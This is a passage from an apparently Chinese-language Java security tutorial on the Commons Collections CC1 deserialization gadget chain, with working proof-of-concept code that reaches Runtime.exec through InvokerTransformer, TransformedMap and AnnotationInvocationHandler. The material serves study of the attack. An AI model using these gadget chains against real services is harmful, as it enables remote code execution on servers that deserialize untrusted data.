class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvocationHandlerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Object map;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvocationHandlerDemo</span><span class="hljs-params">(Map map)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (method.getName().contains(<span class="hljs-string">&quot;put&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Hook Map.put Method: &quot;</span> + method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;detect the method: &quot;</span> + method.getName() + <span class="hljs-string">&quot;, and exec without being hooked&quot;</span>);<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ORIObjectfindName</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;white class: &quot;</span>+ object.hashCode() +<span class="hljs-string">&quot;, pass!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ObjectfindName</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object object;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object object)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object=object;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-keyword">this</span>.getClass().getClassLoader(), <span class="hljs-keyword">this</span>.object.getClass().getInterfaces(),<span class="hljs-keyword">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">for</span>(Object o:args)&#123;<br>            System.out.println(<span class="hljs-string">&quot;black class proxy: &quot;</span>+ o.hashCode() +<span class="hljs-string">&quot;, block!&quot;</span>);<br>            <span class="hljs-keyword">if</span> (o.toString().contains(<span class="hljs-string">&quot;System&quot;</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.object,args);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DynamicProxy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ORIObjectfindName oriObjectfindName = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        oriObjectfindName.getClassName(String.class);<br><br>        ObjectInterface oriObjectfindName1 = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        ObjectfindName objectfindNameproxy = <span class="hljs-keyword">new</span> ObjectfindName();<br>        ObjectInterface objectInterface =(ObjectInterface) objectfindNameproxy.get(oriObjectfindName1);<br>        objectInterface.getClassName(System.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="动态代理类实例序列化问题"><a href="#动态代理类实例序列化问题" class="headerlink" title="动态代理类实例序列化问题"></a>动态代理类实例序列化问题</h5><p>动态代理类符合<code>Java</code>对象序列化条件，并且在<code>序列化/反序列化</code>时会被<code>ObjectInputStream/ObjectOutputStream</code>特殊处理</p><p>动态代理生成的类在<code>反序列化/反序列化</code>时不会序列化该类的成员变量，并且<code>serialVersionUID</code>为<code>0L</code> ，也将是说将该类的<code>Class</code>对象传递给<code>java.io.ObjectStreamClass</code>的静态<code>lookup</code>方法时，返回的<code>ObjectStreamClass</code>实例将具有以下特性：</p><ol><li>调用其<code>getSerialVersionUID</code>方法将返回<code>0L</code></li><li>调用其<code>getFields</code>方法将返回长度为零的数组</li><li>调用其<code>getField</code>方法将返回<code>null</code></li></ol><p>但其父类(<code>java.lang.reflect.Proxy</code>)在序列化时不受影响，父类中的<code>h</code>变量(<code>InvocationHandler</code>)将会被序列化，这个<code>h</code>存储了动态代理类的处理类实例以及动态代理的接口类的实现类的实例</p><p>动态代理生成的对象(<code>com.sun.proxy.$ProxyXXX</code>)序列化的时候会使用一个特殊的协议：<code>TC_PROXYCLASSDESC(0x7D)</code>，这个常量在<code>java.io.ObjectStreamConstants</code>中定义的。在反序列化时也不会调用<code>java.io.ObjectInputStream</code>类的<code>resolveClass</code>方法而是调用<code>resolveProxyClass</code>方法来转换成类对象的</p><h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="p-牛简化-poc"><a href="#p-牛简化-poc" class="headerlink" title="p 牛简化 poc"></a>p 牛简化 poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap&lt;Object, Object&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br>        decorate.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建一个<code>transformer</code>对象链(Transformer 数组存储)：<strong>ConstantTransformer-&gt;返回当前 Runtime 环境的 Runtime 对象；InvokerTransformer-&gt;利用其重写的 transformer 方法进行反射调用 exec 方法</strong></p><p>触发：通过包装<code>HashMap</code>，使用<code>TransformerMap</code>修饰 Map，通过<code>Map.put</code>的操作触发</p><p><strong>通过 ConstantTransformer、ChainedTransformer 完成 payload 在客户端自定义-&gt;服务端反序列化我们的输入 ChainedTransformer 类型&amp;调用 transform 方法</strong>到这里还不足以形成漏洞，因为显然服务端不存在这种代码</p><p>然而通过<code>TransformerMap</code>进一步地延长利用链：<strong>触发条件从显性的调用转换链的 transform 函数延伸到修改 map 的值，而这是一个常规操作并存在于服务段，因此极有可能被触发</strong></p><p>然而这样添加元素的操作或者修改某个键值已然很常见了，但我们符合反序列化攻击的攻击更直接的是触发一个类的<code>readObject</code>对 Map 的数值进行操作</p><h4 id="①jdk1-7-AnnotationInvocationHandler"><a href="#①jdk1-7-AnnotationInvocationHandler" class="headerlink" title="①jdk1.7 AnnotationInvocationHandler"></a>①jdk1.7 AnnotationInvocationHandler</h4><p>实际环境中<code>Commons Collections</code> + <code>AnnotationInvocationHandler</code> 组件非常经典，在 jdk 1.7 中有一个存在一个可利用的 readObject 点 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>，在 idea 中直接搜索，看到其<code>readObject</code>方法以及构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        Class[] var3 = var1.getInterfaces();<br>        <span class="hljs-keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="hljs-number">1</span> &amp;&amp; var3[<span class="hljs-number">0</span>] == Annotation.class) &#123;<br>            <span class="hljs-keyword">this</span>.type = var1;<br>            <span class="hljs-keyword">this</span>.memberValues = var2;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AnnotationFormatError(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Map.Entry var5 = (Map.Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>对于<code>readObject</code>，<code>this.memberValues.entrySet().iterator()</code>，构造方法可知这是<code>Map&lt;String, Object&gt;.entrySet().iterator()</code>，从前面的代码来说，这里是经过了<code>TransformedMap</code>修饰后的对象，后面的代码逻辑是遍历元素并依次设置值，而在调用<code>setValue</code>时就和<code>Map.put()</code>方法一样</p><p>此时我们可以尝试编写 poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = TransformedMap.decorate(hm,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        hm.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;b&quot;</span>);<br><br>        <span class="hljs-comment">//反射获取AnnotationInvocationHandler对象</span><br>        Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object instance = ctor.newInstance(Target.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(instance);<br>        oos.flush();<br>        oos.close();<br><br>        <span class="hljs-comment">//模拟服务端反序列化</span><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>不出意外的话出了意外：<code>Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.Runtime</code>，就是我们<code>Transformer</code>数组储存的<code>new ConstantTransformer(Runtime.getRuntime)</code>中，<code>Runtime</code>类 并不支持序列化(没有实现 Serializable 接口)，要解决这个问题，还得通过反射来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Constructor declaredConstructor = clz.getDeclaredConstructor();<br>declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>Object newInstance = declaredConstructor.newInstance();<br>Method execMeth = clz.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMeth.invoke(newInstance,<span class="hljs-string">&quot;whoami&quot;</span>);<br><br>或单例模式：<br>Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Method getRuntimeMeth = clz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>Runtime runtime = (Runtime) getRuntimeMeth.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>Method execMeth = clz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMeth.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>写进<code>Transformer</code>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        hm.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(newInstance);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//编写技巧？https://www.bilibili.com/video/BV1no4y1U7E1  32:40</span><br><span class="hljs-comment">//1. 先写出反射 2. 例如InvokerTransformer构造方法得知，第一个参数必定传入methodName；第二个参数是参数列表(Class数组型)，至于数组填入什么，那么就看具体的方法参数类型写进数组；第三个参数是传入的参数值(Object数组型)，这个一定要和第二个参数情形一致，比如Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);这样反射是可以的，但是填入Object数组需要填写完整</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Class clz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="hljs-comment">Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">Runtime runtime = (Runtime) getRuntimeMeth.invoke(null, null);</span><br><span class="hljs-comment">Method execMeth = clz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">execMeth.invoke(runtime, &quot;calc&quot;);</span><br><span class="hljs-comment">*/</span><br><br>            Method getRuntimeMeth = (Method) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;).transform(Runtime.class);<br>            Runtime r =(Runtime) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;).transform(getRuntimeMeth);<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br><span class="hljs-comment">//然后利用Transform数组+ChainedTransformer来把这些串起来，注意到我们是从反射的的getMethod开始写的，串起来的链如何调用呢，ChainedTransformer.transform方法是循环调用Transformer数组的，因此传给数组的第一个值即可</span><br><br><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> 